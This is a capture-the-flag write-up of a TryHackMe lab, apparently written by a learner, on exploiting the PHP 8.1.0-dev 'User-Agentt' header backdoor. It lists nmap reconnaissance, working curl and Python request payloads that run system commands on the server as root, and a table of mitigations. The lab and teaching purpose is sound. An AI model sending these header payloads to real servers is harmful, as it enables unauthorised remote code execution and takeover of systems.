[PHP Exploit - User-Agentt RCE](https://tryhackme.com/room/agentt)

**Difficulty:** Easy 

**Objective:** Exploit vulnerable PHP version to gain remote code execution and capture the flag.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.X.X  
**Service/Ports:** 80/HTTP  
**Entry Point:** PHP 8.1.0-dev via User-Agentt header  
**Privilege Escalation:** Not required (root shell from exploit)  
**Outcome:** Remote command execution and flag captured

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance  
### Passive: None  

### Active: Ran Nmap with full version detection.  
Command used: nmap -sS -sV -A -Pn 10.10.X.X  
Result: Port 80 open, running PHP cli server 5.5 or later (PHP 8.1.0-dev)

---

## 4. Enumeration  
- Gobuster, initially showed nothing  
- Explored the website manually; page was static and non-interactive  
- Tried XSS and path traversal payloads — nothing worked  
- Found image URL in GET request: https://source.unsplash.com/Mv9hjnEUHR4/60x60 (stock image, not exploitable)  
- Revisited Nmap scan and focused on PHP version  
- Found public exploit for PHP 8.1.0-dev

---

## 5. Exploitation  
Vulnerability: PHP 8.1.0-dev evaluates the User-Agentt header as PHP code  
Exploit: Exploit-DB 49933  
Technique: Send HTTP request with header User-Agentt: system('id');  
Result: Command executed remotely on the server  
Example request: curl -H "User-Agentt: system('id');" http://10.10.X.X  
Python PoC: requests.get(url, headers={"User-Agentt": "system('id');"})  
Access: Code executed as root

---

## 6. Privilege Escalation  
Not required. Initial code execution was already under root privileges.

---

## 7. Post Exploitation  
Searched for flag with: find / -name "flag*" 2>/dev/null  
Enumerated file system  
No pivoting necessary due to root access

---

## 8. Flags / Proof  

Other Credentials: N/A

---

## 9. Mitigations  
| Vulnerability                     | Risk  | Suggested Mitigation                         |  
|----------------------------------|-------|-----------------------------------------------|  
| PHP 8.1.0-dev code execution     | High  | Do not run development versions in production |  
| Arbitrary header interpretation | High  | Sanitize and validate all HTTP headers         |  
| Lack of privilege separation     | High  | Run web services as limited users             |

---

## 10. Notes  
Time spent: ~30 min

Tools used: nmap, gobuster, curl, Python (requests)  

Lessons learned: Always check the exact version of services; developer versions can introduce dangerous behavior like arbitrary code execution via headers.





















